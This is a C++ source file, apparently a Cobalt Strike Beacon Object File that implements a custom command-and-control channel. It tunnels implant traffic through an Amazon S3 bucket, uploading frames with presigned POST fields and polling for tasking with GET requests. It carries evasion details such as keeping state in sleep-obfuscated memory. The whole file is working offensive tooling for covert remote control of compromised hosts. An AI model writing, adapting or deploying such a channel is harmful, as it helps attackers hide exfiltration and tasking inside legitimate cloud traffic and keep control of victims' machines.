#include <windows.h>
#include <winhttp.h>
#include <intrin.h>
#include <stdint.h>
#include <assert.h>

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#ifndef S3_CONFIG
#define S3_CONFIG "s3-config-patchable.h"
#endif

#include "beacon.h"
#include "udc2.h"
#include "s3-udc2.h"
#include S3_CONFIG
#include "base/helpers.h"
#include "base/http.cpp"

#define memset(src, val, size) __stosb((PBYTE)(src), (val), (size))
#define memcpy(dst, src, n)    __movsb((unsigned char*)(dst), (const unsigned char*)(src), (n))

extern "C" {

// The global state is stored in the .data section which is obfuscated by the Beacon during the sleep
C2State S;

RPC_CSTR generateSessionId() {
    DFR_LOCAL(rpcrt4, UuidCreate);
    DFR_LOCAL(rpcrt4, UuidToStringA);

    UUID u = { };
    RPC_STATUS st = UuidCreate(&u);
    if (st != RPC_S_OK && st != RPC_S_UUID_LOCAL_ONLY) {
        return NULL;
    }

    RPC_CSTR str = NULL;
    st = UuidToStringA(&u, &str);
    if (st != RPC_S_OK) {
        return NULL;
    }

    return str;
}

// Beacon's BOF loader doesn't support static vars inside of the function
static unsigned int gRandSeed = 0;
static bool gRandInitialized = false;
int rand() {
    DFR_LOCAL(kernel32, GetSystemTimeAsFileTime);

    if (!gRandInitialized) {
        FILETIME ft;
        ULARGE_INTEGER uli;

        GetSystemTimeAsFileTime(&ft);

        uli.LowPart  = ft.dwLowDateTime;
        uli.HighPart = ft.dwHighDateTime;

        gRandSeed = (unsigned int)(uli.LowPart ^ uli.HighPart);
        if (gRandSeed == 0) gRandSeed = 1;

        gRandInitialized = true;
    }

    gRandSeed = gRandSeed * 214013u + 2531011u;
    return (int)((gRandSeed >> 16) & 0x7FFF);
}

void randomBoundary(char* boundary, size_t len) {
    for (size_t i = 0; i < len - 1; i++) {
        boundary[i] = 'a' + (rand() % 26);
    }
    boundary[len - 1] = '\0';
}

void arenaReset() {
    S.arenaOffset = 0;
}

void* arenaAlloc(size_t size) {
#ifdef _DEBUG
    assert(size <= sizeof(S.arena) - S.arenaOffset);
#endif
    if (size > sizeof(S.arena) - S.arenaOffset || size == 0) return NULL;
    void* buff = S.arena + S.arenaOffset;
    S.arenaOffset += size;
    memset(buff, 0, size);
    return buff;
}

wchar_t* arenaToWideChar(formatp* fmt) {
	int len;
	char* str = BeaconFormatToString(fmt, &len);
    len++; // space for the null termination
	wchar_t* strW = (wchar_t*)arenaAlloc(len*2);
    if (!strW) return NULL;
	toWideChar(str, strW, len*2);
    return strW;
}

bool arenaFormat(formatp* p, int size) {
    char* buff = (char*)arenaAlloc(size);
    if (!buff) return false;
    p->original = buff;
    p->buffer = buff;
    p->length = 0;
    p->size = size;
    return true;
}

bool uploadFrame(FrameType subject, const char* frame, unsigned int len) {
    formatp fmt;
    arenaReset();
    if (!arenaFormat(&fmt, 4096)) return false;

    // Generate a random boundary string for the multipart form
    char boundary[33];
    randomBoundary(boundary, sizeof(boundary));

    // Generate the required headers
	BeaconFormatReset(&fmt);
	BeaconFormatPrintf(&fmt,
		"Content-Type: multipart/form-data; boundary=%s\r\n",
		boundary
	);
    wchar_t* headersW = arenaToWideChar(&fmt);
    if (!headersW) return false;

    // Build the multipart/form-data
    struct {
        const char* key;
        const char* value;
    } fields[] = {
        { "key",              S.s3.uploadKey },
        { "x-amz-algorithm",  "AWS4-HMAC-SHA256" },
        { "x-amz-credential", S.s3.xAmzCredential },
        { "x-amz-date",       S.s3.xAmzDate },
        { "policy",           S.s3.xAmzPolicy },
        { "x-amz-signature",  S.s3.xAmzSignature },
    };
    BeaconFormatReset(&fmt);
    for (unsigned int i = 0; i < sizeof(fields) / sizeof(fields[0]); ++i) {
        BeaconFormatPrintf(&fmt,
			"--%s\r\n"
			"Content-Disposition: form-data; name=\"%s\"\r\n"
			"\r\n"
			"%s\r\n",
            boundary,
            fields[i].key,
            fields[i].value
        );
    }

    // The start of the "file" part, the actual content will be written directly from the 'frame' buffer into the socket
    BeaconFormatPrintf(&fmt,
		"--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "\r\n",
        boundary,
        S.sessionId
    );

    int partialLen;
	char* partial = BeaconFormatToString(&fmt, &partialLen);

    // The size of the full request body
    unsigned int totalLen = (unsigned int)partialLen +      // the metadata
							sizeof(subject) +               // the type of the payload
							len +                           // the actual payload
							4 + (sizeof(boundary) - 1) + 4; // the final boundary

    // Send the partial form
    HttpRequest req = {
        .hSession   = S.hSession,
        .useHttps   = true,
        .method     = L"POST",
        .host       = S.s3.host,
        .port       = 443,
        .path       = L"/",
        .headers    = headersW,
        .payload    = partial,
        .payloadLen = (unsigned int)partialLen,
        .totalLen   = totalLen
    };
    HttpResponse resp = httpRequest(&req);

    // Write the actual payload
    if (!httpWrite(&resp, (char*)&subject, sizeof(subject)) ||
        !httpWrite(&resp, frame, len))
    {
        httpClose(&resp);
        return false;
    }

    // Write the closing boundary
    if (!httpWrite(&resp, "\r\n--", 4) ||
        !httpWrite(&resp, boundary, sizeof(boundary) - 1) || 
        !httpWrite(&resp, "--\r\n", 4))
    {
        httpClose(&resp);
        return false;
    }

    httpClose(&resp);
	return resp.status == HTTP_STATUS_NO_CONTENT;
}

int readFrame(char* buffer, int bufferSize) {
    DFR_LOCAL(kernel32, Sleep);

    if (!buffer || bufferSize <= 0) return -1;


    // Generate the url
    formatp fmt;
    arenaReset();
    if (!arenaFormat(&fmt, 1024)) return -1;
	BeaconFormatPrintf(&fmt,
        "/%s/%s",
        S.s3.downloadKey,
		S.sessionId
	);
    wchar_t* downloadPath = arenaToWideChar(&fmt);
    if (!downloadPath) return -1;

    for (int attempt = 0; attempt < S.maxFrameRetries; ++attempt) {
		HttpRequest req = {
			.hSession   = S.hSession,
			.useHttps   = true,
			.method     = L"GET",
			.host       = S.s3.host,
			.port       = 443,
			.path       = downloadPath,
            .headers    = NULL,
			.payload    = NULL,
			.payloadLen = 0,
			.totalLen   = 0
		};

		HttpResponse resp = httpRequest(&req);

		if (resp.status == HTTP_STATUS_OK) {
			uint64_t respNonce = 0;

            // Read the nonce value from the body
            if (!httpReadN(&resp, (char*)&respNonce, sizeof(respNonce), NULL)) {
                httpClose(&resp);
                Sleep(S.frameRetryDelayMs);
                continue;
            }

            // Same frame as last time, just wait for a new one
            if (respNonce == S.nonce) {
                httpClose(&resp);
                Sleep(S.frameRetryDelayMs);
                continue;
            }

            // Update the nonce and read the rest of the frame
            S.nonce = respNonce;
		    unsigned int bytesWrittenTotal;
            if (!httpReadBody(&resp, buffer, bufferSize, &bytesWrittenTotal)) {
                httpClose(&resp);
                Sleep(S.frameRetryDelayMs);
                continue;
            }

            httpClose(&resp);
            return (int)bytesWrittenTotal;
		}

		httpClose(&resp);
		Sleep(S.frameRetryDelayMs);
    }

    return -1;
}

bool generateSessionInfo() {
    DFR_LOCAL(rpcrt4, RpcStringFreeA);

    // Generate the unique id for this Beacon
    if (S.sessionId) RpcStringFreeA(&S.sessionId);
    S.sessionId = generateSessionId();
    if (S.sessionId == NULL) {
        return false;
    }

    return true;
}

int udc2Proxy(const char* write, int writeLen, char* read, int maxReadLen) {
#ifdef _DEBUG
        Sleep(2000);
#endif

    FrameType type = FrameType::Frame;
    if (!S.connected) {
        generateSessionInfo();
        S.connected = true;
        type = FrameType::Metadata;
    }
    
    if (!uploadFrame(type, write, writeLen)) {
        S.connected = false;
        return -1;
    }

    int bytesRead = readFrame(read, maxReadLen);
    if (bytesRead <= 0) {
        S.connected = false;
    }

    return bytesRead;
}

void udc2Close() {
    DFR_LOCAL(rpcrt4, RpcStringFreeA);
    DFR_LOCAL(WinHttp, WinHttpCloseHandle);

    uploadFrame(FrameType::Exit, NULL, 0);

    if (S.sessionId) {
        RpcStringFreeA(&S.sessionId);
        S.sessionId = NULL;
    }
    if (S.hSession) {
        WinHttpCloseHandle(S.hSession);
        S.hSession = 0;
    }
}

bool init() {
    DFR_LOCAL(WinHttp, WinHttpOpen);
    memset(&S, 0, sizeof(S));

    S.maxFrameRetries   = MAX_FRAME_RETRIES;
    S.frameRetryDelayMs = FRAME_RETRY_DELAY_MS;

#ifdef DEFAULT_S3_INFO
    S.s3 = DEFAULT_S3_INFO;
#else
	S3Info defaultS3 = {
		.host           = S3_HOST,
		.uploadKey      = S3_UPLOAD_KEY "/${filename}",
		.downloadKey    = S3_DOWNLOAD_KEY,
		.xAmzCredential = X_AMZ_CREDENTIAL,
		.xAmzDate       = X_AMZ_DATE,
		.xAmzSignature  = X_AMZ_SIGNATURE,
		.xAmzPolicy     = X_AMZ_POLICY,
	};
    S.s3 = defaultS3;
#endif

    S.hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    // Put the ptr of the state into Beacon Key/Value store. So, we can modify the state via a normal BOF
#ifdef C2_STATE_KEY
    BeaconAddValue(C2_STATE_KEY, &S);
#endif

    return S.hSession != NULL;
}

void go(char* args, int len) {
    PUDC2_INFO funcs = (PUDC2_INFO)args;
    (void)len;

    if (init()) {
        funcs->proxyCall = udc2Proxy;
        funcs->proxyClose = udc2Close;
        funcs->version = 0x041200;
    }
}

}
